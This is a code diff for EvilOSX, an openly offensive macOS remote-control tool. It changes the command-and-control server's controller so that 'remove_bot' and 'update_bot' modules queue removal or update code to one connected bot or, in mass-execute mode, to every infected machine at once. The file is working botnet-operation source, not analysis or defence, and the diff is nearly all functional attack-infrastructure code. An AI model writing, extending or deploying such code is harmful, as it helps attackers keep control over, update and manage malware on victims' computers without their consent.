@@ -14,6 +14,7 @@ from urllib.parse import unquote_plus
 from urwid import ExitMainLoop
 
 from server import modules
+from bot import loaders
 from server.model import Command, CommandType, Bot, RequestType, PayloadFactory
 from server.version import VERSION
 
@@ -126,11 +127,6 @@ class Controller:
         elif command == "modules":
             self._view.output("Type \"use <module_name>\" to use a module.", "info")
 
-            special_modules = {
-                "remove_bot": "Remove EvilOSX from the bot.",
-                "update_bot": "Update the bot to the latest (local) version."
-            }
-
             for module_name in modules.get_names():
                 try:
                     info = modules.get_info(module_name)
@@ -138,9 +134,6 @@ class Controller:
                     self._view.output("{:16} -  {}".format(module_name, info["Description"]))
                 except AttributeError as ex:
                     self._view.output(str(ex), "attention")
-
-            for name, description in special_modules.items():
-                self._view.output("{:16} -  {}".format(name, description))
         elif command.startswith("useall"):
             if command == "useall":
                 self._view.output("Usage: useall <module_name>", "attention")
@@ -179,8 +172,38 @@ class Controller:
     def _run_module(self, module_name, mass_execute=False):
         """Setup then run the module, required because otherwise calls to prompt block the main thread."""
         if module_name in ["remove_bot", "update_bot"]:
-            # Special modules.
-            pass
+            # Special modules which aren't in the modules directory.
+            code = ("", b"")
+
+            if mass_execute:
+                bots = self._model.get_bots()
+
+                for bot in bots:
+                    if module_name == "remove_bot":
+                        if code[0] != bot.loader_name:
+                            code = (bot.loader_name, loaders.get_remove_code(bot.loader_name))
+                    elif module_name == "update_bot":
+                        if code[0] != bot.loader_name:
+                            code = (bot.loader_name, loaders.get_update_code(bot.loader_name))
+
+                    self._model.add_command(bot.uid, Command(
+                        CommandType.MODULE, code[1]
+                    ))
+
+                self._view.output("Module added to the queue of {} bots.".format(len(bots)))
+            else:
+                if module_name == "remove_bot":
+                    code = loaders.get_remove_code(self._connected_bot.loader_name)
+                elif module_name == "update_bot":
+                    code = loaders.get_update_code(self._connected_bot.loader_name)
+
+                self._model.add_command(self._connected_bot.uid, Command(
+                    CommandType.MODULE, code
+                ))
+
+                self._view.output("Module added to the queue of \"{}@{}\".".format(
+                    self._connected_bot.username, self._connected_bot.hostname
+                ), "info")
         else:
             try:
                 successful, options = modules.get_options(module_name, self._view)
